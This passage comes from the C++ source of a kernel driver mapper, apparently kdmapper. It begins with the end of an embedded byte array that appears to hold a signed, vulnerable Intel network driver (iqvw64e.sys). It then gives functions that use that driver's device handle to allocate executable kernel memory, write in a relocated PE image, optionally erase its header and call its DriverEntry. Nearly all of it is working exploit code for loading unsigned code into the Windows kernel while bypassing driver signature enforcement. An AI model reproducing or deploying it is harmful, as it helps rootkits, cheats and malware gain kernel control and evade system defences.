		0x96, 0xFA, 0xE5, 0x87, 0x77, 0xC6, 0xB5, 0x56, 0xB2, 0x7A, 0x3B, 0x54, 0x30, 0x53, 0x1B, 0xDF, 0x62, 0x34, 0xFF, 0x1E, 0xD1, 0xF4, 0x5A, 0x93, 0x28, 0x85, 0xE5, 0x4C, 0x17, 0x4E, 0x7E, 0x5B, 0xFD, 0xA4, 0x93, 0x99, 0x7F, 0xDF, 0xCD, 0xEF,
		0xA4, 0x75, 0xEF, 0xEF, 0x15, 0xF6, 0x47, 0xE7, 0xF8, 0x19, 0x72, 0xD8, 0x2E, 0x34, 0x1A, 0xA6, 0xB4, 0xA7, 0x4C, 0x7E, 0xBD, 0xBB, 0x4F, 0x0C, 0x3D, 0x57, 0xF1, 0x30, 0xD6, 0xA6, 0x36, 0x8E, 0xD6, 0x80, 0x76, 0xD7, 0x19, 0x2E, 0xA5, 0xCD,
		0x7E, 0x34, 0x2D, 0x89, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0xFE, 0x30, 0x82, 0x01, 0xFA, 0x30, 0x12, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x08, 0x30, 0x06, 0x01, 0x01, 0xFF, 0x02, 0x01, 0x00, 0x30, 0x70, 0x06,
		0x03, 0x55, 0x1D, 0x20, 0x04, 0x69, 0x30, 0x67, 0x30, 0x65, 0x06, 0x0B, 0x60, 0x86, 0x48, 0x01, 0x86, 0xF8, 0x45, 0x01, 0x07, 0x17, 0x03, 0x30, 0x56, 0x30, 0x28, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01, 0x16, 0x1C, 0x68,
		0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x63, 0x70, 0x73, 0x30, 0x2A, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x02, 0x30,
		0x1E, 0x1A, 0x1C, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x72, 0x70, 0x61, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01,
		0xFF, 0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x6D, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x0C, 0x04, 0x61, 0x30, 0x5F, 0xA1, 0x5D, 0xA0, 0x5B, 0x30, 0x59, 0x30, 0x57, 0x30, 0x55, 0x16, 0x09, 0x69, 0x6D, 0x61, 0x67, 0x65,
		0x2F, 0x67, 0x69, 0x66, 0x30, 0x21, 0x30, 0x1F, 0x30, 0x07, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x04, 0x14, 0x8F, 0xE5, 0xD3, 0x1A, 0x86, 0xAC, 0x8D, 0x8E, 0x6B, 0xC3, 0xCF, 0x80, 0x6A, 0xD4, 0x48, 0x18, 0x2C, 0x7B, 0x19, 0x2E, 0x30,
		0x25, 0x16, 0x23, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6C, 0x6F, 0x67, 0x6F, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x76, 0x73, 0x6C, 0x6F, 0x67, 0x6F, 0x2E, 0x67, 0x69, 0x66, 0x30, 0x34,
		0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x2D, 0x30, 0x2B, 0x30, 0x29, 0xA0, 0x27, 0xA0, 0x25, 0x86, 0x23, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x6C, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D,
		0x2F, 0x70, 0x63, 0x61, 0x33, 0x2D, 0x67, 0x35, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x34, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x28, 0x30, 0x26, 0x30, 0x24, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x01,
		0x86, 0x18, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6F, 0x63, 0x73, 0x70, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x16, 0x30, 0x14, 0x06, 0x08, 0x2B,
		0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x02, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x30, 0x28, 0x06, 0x03, 0x55, 0x1D, 0x11, 0x04, 0x21, 0x30, 0x1F, 0xA4, 0x1D, 0x30, 0x1B, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04,
		0x03, 0x13, 0x10, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x4D, 0x50, 0x4B, 0x49, 0x2D, 0x32, 0x2D, 0x38, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0xCF, 0x99, 0xA9, 0xEA, 0x7B, 0x26, 0xF4, 0x4B, 0xC9, 0x8E,
		0x8F, 0xD7, 0xF0, 0x05, 0x26, 0xEF, 0xE3, 0xD2, 0xA7, 0x9D, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x7F, 0xD3, 0x65, 0xA7, 0xC2, 0xDD, 0xEC, 0xBB, 0xF0, 0x30, 0x09, 0xF3, 0x43, 0x39, 0xFA, 0x02, 0xAF,
		0x33, 0x31, 0x33, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x56, 0x22, 0xE6, 0x34, 0xA4, 0xC4, 0x61, 0xCB, 0x48, 0xB9, 0x01, 0xAD, 0x56, 0xA8, 0x64, 0x0F, 0xD9,
		0x8C, 0x91, 0xC4, 0xBB, 0xCC, 0x0C, 0xE5, 0xAD, 0x7A, 0xA0, 0x22, 0x7F, 0xDF, 0x47, 0x38, 0x4A, 0x2D, 0x6C, 0xD1, 0x7F, 0x71, 0x1A, 0x7C, 0xEC, 0x70, 0xA9, 0xB1, 0xF0, 0x4F, 0xE4, 0x0F, 0x0C, 0x53, 0xFA, 0x15, 0x5E, 0xFE, 0x74, 0x98, 0x49,
		0x24, 0x85, 0x81, 0x26, 0x1C, 0x91, 0x14, 0x47, 0xB0, 0x4C, 0x63, 0x8C, 0xBB, 0xA1, 0x34, 0xD4, 0xC6, 0x45, 0xE8, 0x0D, 0x85, 0x26, 0x73, 0x03, 0xD0, 0xA9, 0x8C, 0x64, 0x6D, 0xDC, 0x71, 0x92, 0xE6, 0x45, 0x05, 0x60, 0x15, 0x59, 0x51, 0x39,
		0xFC, 0x58, 0x14, 0x6B, 0xFE, 0xD4, 0xA4, 0xED, 0x79, 0x6B, 0x08, 0x0C, 0x41, 0x72, 0xE7, 0x37, 0x22, 0x06, 0x09, 0xBE, 0x23, 0xE9, 0x3F, 0x44, 0x9A, 0x1E, 0xE9, 0x61, 0x9D, 0xCC, 0xB1, 0x90, 0x5C, 0xFC, 0x3D, 0xD2, 0x8D, 0xAC, 0x42, 0x3D,
		0x65, 0x36, 0xD4, 0xB4, 0x3D, 0x40, 0x28, 0x8F, 0x9B, 0x10, 0xCF, 0x23, 0x26, 0xCC, 0x4B, 0x20, 0xCB, 0x90, 0x1F, 0x5D, 0x8C, 0x4C, 0x34, 0xCA, 0x3C, 0xD8, 0xE5, 0x37, 0xD6, 0x6F, 0xA5, 0x20, 0xBD, 0x34, 0xEB, 0x26, 0xD9, 0xAE, 0x0D, 0xE7,
		0xC5, 0x9A, 0xF7, 0xA1, 0xB4, 0x21, 0x91, 0x33, 0x6F, 0x86, 0xE8, 0x58, 0xBB, 0x25, 0x7C, 0x74, 0x0E, 0x58, 0xFE, 0x75, 0x1B, 0x63, 0x3F, 0xCE, 0x31, 0x7C, 0x9B, 0x8F, 0x1B, 0x96, 0x9E, 0xC5, 0x53, 0x76, 0x84, 0x5B, 0x9C, 0xAD, 0x91, 0xFA,
		0xAC, 0xED, 0x93, 0xBA, 0x5D, 0xC8, 0x21, 0x53, 0xC2, 0x82, 0x53, 0x63, 0xAF, 0x12, 0x0D, 0x50, 0x87, 0x11, 0x1B, 0x3D, 0x54, 0x52, 0x96, 0x8A, 0x2C, 0x9C, 0x3D, 0x92, 0x1A, 0x08, 0x9A, 0x05, 0x2E, 0xC7, 0x93, 0xA5, 0x48, 0x91, 0xD3, 0x31,
		0x82, 0x04, 0xB1, 0x30, 0x82, 0x04, 0xAD, 0x02, 0x01, 0x01, 0x30, 0x81, 0xC9, 0x30, 0x81, 0xB4, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x17, 0x30, 0x15, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x0E,
		0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x2C, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x16, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x54, 0x72, 0x75, 0x73, 0x74, 0x20,
		0x4E, 0x65, 0x74, 0x77, 0x6F, 0x72, 0x6B, 0x31, 0x3B, 0x30, 0x39, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x32, 0x54, 0x65, 0x72, 0x6D, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x75, 0x73, 0x65, 0x20, 0x61, 0x74, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A,
		0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x72, 0x70, 0x61, 0x20, 0x28, 0x63, 0x29, 0x31, 0x30, 0x31, 0x2E, 0x30, 0x2C, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x56,
		0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x33, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x32, 0x30, 0x31, 0x30, 0x20, 0x43, 0x41, 0x02, 0x10, 0x27, 0x76,
		0xAB, 0x5C, 0xF2, 0xD0, 0x98, 0x72, 0xF1, 0xAD, 0x05, 0xFB, 0xC3, 0xF2, 0x1A, 0x87, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0xA0, 0x81, 0xAE, 0x30, 0x19, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09,
		0x03, 0x31, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0x30, 0x1C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0B, 0x31, 0x0E, 0x30, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01,
		0x82, 0x37, 0x02, 0x01, 0x15, 0x30, 0x23, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xBF, 0x5E, 0x19, 0x5A, 0x26, 0xCE, 0xEE, 0x79, 0x35, 0x43, 0x4E, 0x90, 0xC2, 0xE7, 0xF9, 0xE7, 0xE9, 0xB9,
		0x18, 0x48, 0x30, 0x4E, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0C, 0x31, 0x40, 0x30, 0x3E, 0xA0, 0x3C, 0x80, 0x3A, 0x00, 0x2E, 0x00, 0x2E, 0x00, 0x5C, 0x00, 0x64, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65,
		0x00, 0x72, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x36, 0x00, 0x34, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x69, 0x00, 0x71, 0x00, 0x76, 0x00, 0x77, 0x00, 0x36, 0x00, 0x34, 0x00, 0x65, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x59,
		0x00, 0x53, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x82, 0x01, 0x00, 0x38, 0x2A, 0xB5, 0x14, 0xC2, 0x12, 0xD3, 0x1C, 0x90, 0x31, 0xF0, 0x6C, 0xC9, 0x16, 0x5A, 0xDD, 0x0B, 0x6E, 0x95,
		0x0B, 0x1F, 0x57, 0x0A, 0x1C, 0xDC, 0x08, 0xED, 0xD5, 0x95, 0x01, 0x9E, 0x92, 0x50, 0x1E, 0x82, 0x1D, 0x31, 0x61, 0xE7, 0x10, 0x66, 0x78, 0xC0, 0x50, 0x45, 0x71, 0x40, 0x11, 0x3F, 0x60, 0xC0, 0xBF, 0xDF, 0x61, 0xB7, 0x25, 0x80, 0x31, 0x91,
		0x38, 0x38, 0x39, 0x4A, 0xB4, 0x1C, 0x94, 0xA2, 0x8B, 0xBD, 0xAA, 0xE1, 0x7C, 0x68, 0x68, 0x2D, 0x96, 0xB9, 0x34, 0x96, 0x56, 0x50, 0xFA, 0xC6, 0xB9, 0xD4, 0xE4, 0x6E, 0x8C, 0x22, 0xC8, 0x18, 0xEF, 0x5F, 0x6E, 0x5D, 0x43, 0x15, 0x13, 0x5A,
		0x4F, 0x11, 0x2E, 0xE1, 0x43, 0xAE, 0x6A, 0x44, 0x7C, 0xC8, 0x6F, 0xE3, 0xFB, 0xDE, 0xBF, 0x20, 0xF3, 0x8B, 0xFB, 0x1A, 0x7D, 0xF4, 0xCB, 0xEA, 0xC0, 0x47, 0x5F, 0xAA, 0x5A, 0xC4, 0x9B, 0x5D, 0x4A, 0xC4, 0x11, 0x45, 0xB4, 0x00, 0x40, 0x1F,
		0x35, 0x5C, 0x18, 0x06, 0xA5, 0xCF, 0x92, 0x77, 0x72, 0xB7, 0xF1, 0xF5, 0xE7, 0x55, 0x46, 0xFB, 0xB3, 0xED, 0x1E, 0xDA, 0x99, 0x49, 0xF8, 0x5A, 0x36, 0x8B, 0xD3, 0xED, 0xA1, 0xFF, 0x6F, 0x3D, 0x25, 0x3D, 0x57, 0xA0, 0xB9, 0x75, 0x94, 0x1F,
		0x44, 0x29, 0x79, 0x45, 0xD7, 0x29, 0x2C, 0xD0, 0xBC, 0x2E, 0x4D, 0x32, 0xDA, 0x24, 0x57, 0x8D, 0x2C, 0x30, 0xE4, 0x93, 0x07, 0xE2, 0xE6, 0x02, 0x8E, 0xEE, 0x53, 0xEF, 0x9A, 0xD8, 0x09, 0x16, 0xF9, 0xD0, 0xB1, 0x3F, 0x17, 0xF1, 0xB7, 0xB3,
		0x79, 0x67, 0x9B, 0x2D, 0x28, 0xD5, 0x06, 0x39, 0x87, 0x79, 0x0F, 0xF2, 0x42, 0xB2, 0xF2, 0x9A, 0x31, 0xDB, 0x47, 0x0F, 0xCE, 0xF5, 0xBD, 0x97, 0x0C, 0xF3, 0xCE, 0x82, 0x02, 0xC9, 0xB6, 0x9F, 0xB2, 0x69, 0x7F, 0x68, 0xB3, 0xA1, 0x82, 0x02,
		0x0B, 0x30, 0x82, 0x02, 0x07, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x06, 0x31, 0x82, 0x01, 0xF8, 0x30, 0x82, 0x01, 0xF4, 0x02, 0x01, 0x01, 0x30, 0x72, 0x30, 0x5E, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06,
		0x13, 0x02, 0x55, 0x53, 0x31, 0x1D, 0x30, 0x1B, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x14, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x31, 0x30, 0x30, 0x2E, 0x06,
		0x03, 0x55, 0x04, 0x03, 0x13, 0x27, 0x53, 0x79, 0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x43, 0x41,
		0x20, 0x2D, 0x20, 0x47, 0x32, 0x02, 0x10, 0x0E, 0xCF, 0xF4, 0x38, 0xC8, 0xFE, 0xBF, 0x35, 0x6E, 0x04, 0xD8, 0x6A, 0x98, 0x1B, 0x1A, 0x50, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0xA0, 0x5D, 0x30, 0x18, 0x06, 0x09,
		0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31, 0x0B, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x01, 0x30, 0x1C, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x05, 0x31, 0x0F, 0x17, 0x0D, 0x31,
		0x33, 0x31, 0x31, 0x31, 0x34, 0x31, 0x35, 0x32, 0x33, 0x32, 0x32, 0x5A, 0x30, 0x23, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xE4, 0x7B, 0x46, 0x28, 0x1A, 0x0A, 0x97, 0xDE, 0xA3, 0x12, 0x49,
		0x27, 0x2C, 0x3B, 0x8B, 0x11, 0x6A, 0x2A, 0xDF, 0x0D, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x82, 0x01, 0x00, 0x64, 0x74, 0x6E, 0x03, 0x75, 0xCA, 0xAB, 0x84, 0x0C, 0x64, 0x50, 0x03,
		0xA4, 0x8A, 0x89, 0xAB, 0x94, 0x95, 0xC6, 0xC5, 0xC6, 0xF5, 0x12, 0x82, 0xAF, 0xC7, 0xD5, 0xDF, 0xE5, 0xCE, 0xD8, 0x80, 0x9C, 0x64, 0x31, 0x1C, 0x4E, 0xC9, 0x55, 0xF6, 0xA2, 0x12, 0x8A, 0xBD, 0x8D, 0x56, 0xE0, 0xE3, 0x7C, 0x12, 0x55, 0x1F,
		0x22, 0xFD, 0xB8, 0x2B, 0x5C, 0xE2, 0xBC, 0xCB, 0x02, 0xC6, 0x0A, 0x50, 0x21, 0x8D, 0x5B, 0x0C, 0xA3, 0x4D, 0x82, 0xF3, 0x8F, 0x5F, 0xF5, 0xB8, 0xF9, 0xD3, 0x77, 0x96, 0xEC, 0xCD, 0xA3, 0x95, 0x07, 0x2B, 0x38, 0x9E, 0x98, 0x2A, 0x84, 0x7A,
		0xED, 0xD3, 0x38, 0xF1, 0xE4, 0xF2, 0x52, 0x25, 0x76, 0xDE, 0x47, 0x47, 0x1A, 0x09, 0x5E, 0x71, 0xAF, 0x4F, 0x71, 0xDB, 0xA3, 0x3C, 0x85, 0xDE, 0xA1, 0x89, 0x32, 0xA6, 0xF1, 0xA2, 0xE2, 0x77, 0x7D, 0x63, 0x24, 0x3C, 0xB0, 0x03, 0xF8, 0x5B,
		0x00, 0x9E, 0x16, 0xC0, 0x83, 0x45, 0x38, 0xE6, 0x1F, 0xEB, 0x62, 0x18, 0x61, 0x9A, 0x06, 0x58, 0xEB, 0x64, 0x29, 0x88, 0xD0, 0xB8, 0xB5, 0x33, 0x9B, 0x5A, 0x7B, 0xE0, 0x24, 0xDC, 0x7F, 0x54, 0x87, 0x60, 0x1A, 0x4B, 0x53, 0x7F, 0x21, 0xF6,
		0x79, 0x24, 0xD9, 0x3E, 0x8C, 0x6A, 0x8B, 0x0C, 0xDD, 0xB8, 0x90, 0x06, 0xD8, 0x70, 0x31, 0xF0, 0xC7, 0xEC, 0x5C, 0x06, 0x63, 0x62, 0xEA, 0x1A, 0x5C, 0x92, 0x96, 0x13, 0x26, 0x44, 0xE6, 0x07, 0xD2, 0x66, 0x30, 0x8C, 0x05, 0xF0, 0xB0, 0x26,
		0x38, 0x0B, 0x61, 0x39, 0x05, 0x44, 0xCF, 0x94, 0x95, 0x2A, 0x8B, 0x44, 0x74, 0x2D, 0x5E, 0x66, 0x57, 0xBC, 0xE2, 0xCB, 0x97, 0x94, 0xC2, 0x3D, 0x45, 0x12, 0xCE, 0x5C, 0x76, 0x58, 0x2D, 0xB0, 0x6F, 0xC7, 0x2E, 0xC2, 0x62, 0xC3, 0xB3, 0xCC,
		0x07, 0x60, 0xD4, 0x37, 0x00, 0x00, 0x00, 0x00
	};
}
```

`kdmapper/kdmapper/kdmapper.cpp`:

```cpp
#include "kdmapper.hpp"


uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
	/*added by psec*/
	LARGE_INTEGER LowAddress, HighAddress;
	LowAddress.QuadPart = 0;
	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;

	uint64_t pages = (size / PAGE_SIZE) + 1;
	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
	if (!mdl) {
		Log(L"[-] Can't allocate pages for mdl" << std::endl);
		return { 0 };
	}

	uint32_t byteCount = 0;
	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
		Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
		return { 0 };
	}

	if (byteCount < size) {
		Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
	if (!mappingStartAddress) {
		Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
	if (!result) {
		Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}
	Log(L"[+] Allocated pages for mdl" << std::endl);

	if (mdlPtr)
		*mdlPtr = mdl;

	return mappingStartAddress;
}

uint64_t kdmapper::AllocIndependentPages(HANDLE device_handle, uint32_t size)
{
	const auto base = intel_driver::MmAllocateIndependentPagesEx(device_handle, size);
	if (!base)
	{
		Log(L"[-] Error allocating independent pages" << std::endl);
		return 0;
	}

	if (!intel_driver::MmSetPageProtection(device_handle, base, size, PAGE_EXECUTE_READWRITE))
	{
		Log(L"[-] Failed to change page protections" << std::endl);
		intel_driver::MmFreeIndependentPages(device_handle, base, size);
		return 0;
	}

	return base;
}

uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, AllocationMode mode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {

	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);

	if (!nt_headers) {
		Log(L"[-] Invalid format of PE image" << std::endl);
		return 0;
	}

	if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		Log(L"[-] Image is not 64 bit" << std::endl);
		return 0;
	}

	uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!local_image_base)
		return 0;

	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);

	uint64_t kernel_image_base = 0;
	uint64_t mdlptr = 0;
	if (mode == AllocationMode::AllocateMdl) {
		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
	}
	else if (mode == AllocationMode::AllocateIndependentPages) {
		kernel_image_base = AllocIndependentPages(iqvw64e_device_handle, image_size);
	}
	else { // AllocatePool by default
		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
	}

	do {
		if (!kernel_image_base) {
			Log(L"[-] Failed to allocate remote image in kernel" << std::endl);
			break;
		}

		Log(L"[+] Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl);

		// Copy image headers

		memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections

		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
				continue;
			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
		}

		uint64_t realBase = kernel_image_base;
		if (destroyHeader) {
			kernel_image_base -= TotalVirtualHeaderSize;
			Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header" << std::endl);
		}

		// Resolve relocs and imports

		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!FixSecurityCookie(local_image_base, kernel_image_base ))
		{
			Log(L"[-] Failed to fix cookie" << std::endl);
			return 0;
		}

		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
			Log(L"[-] Failed to resolve imports" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Write fixed image to kernel

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
			Log(L"[-] Failed to write local image to remote image" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Call driver entry point

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

		Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl);

		if (callback) {
			if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
				Log(L"[-] Callback returns false, failed!" << std::endl);
				kernel_image_base = realBase;
				break;
			}
		}

		NTSTATUS status = 0;
		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
			Log(L"[-] Failed to call driver entry" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		if (exitCode)
			*exitCode = status;

		Log(L"[+] DriverEntry returned 0x" << std::hex << status << std::endl);

		// Free memory
		if (free) {
			Log(L"[+] Freeing memory" << std::endl);
			bool free_status = false;

			if (mode == AllocationMode::AllocateMdl) {
				free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
				free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
				free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
			}
